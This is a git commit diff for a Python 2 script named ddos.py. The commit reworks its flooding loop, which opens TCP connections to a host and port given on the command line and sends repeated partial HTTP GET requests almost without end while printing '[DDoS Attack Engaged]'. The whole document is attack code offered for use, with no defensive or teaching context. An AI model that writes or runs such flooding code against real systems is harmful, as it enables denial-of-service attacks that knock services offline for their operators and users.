a3b1c2420a4ee9ee8af026c22f2e90de6890cd19
Henrique Bissoli <emp.shad@gmail.com>
2016-01-11 14:51:06 -0200

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -10,19 +10,16 @@ if len(sys.argv)>2:
 	port=sys.argv[2]
 	message="Flood"
 	ip = socket.gethostbyname(host)
-	def dos():
+	for i in xrange(999999999999):
 	    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	    try:
 	        ddos.connect((host, 80))
-	        ddos.send( "GET /%s HTTP/1.1\r\n" % message)
-	        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port))
-	        ddos.send( "GET /%s HTTP/1.1\r\n" % message)
+	        ddos.send("GET /%s HTTP/1.1\r\n" % message)
+	        ddos.sendto("GET /%s HTTP/1.1\r\n" % message, (ip, port))
+	        ddos.send("GET /%s HTTP/1.1\r\n" % message)
 	    except socket.error, msg:
 	        print("|[Connection Failed]         |")
 	    print ("|[DDoS Attack Engaged]       |")
 	    ddos.close()
-	
-	for i in xrange(999999999999):
-	    dos()
 else:
 	print("Usage:\tpython "+sys.argv[0]+" <ip> <port>")
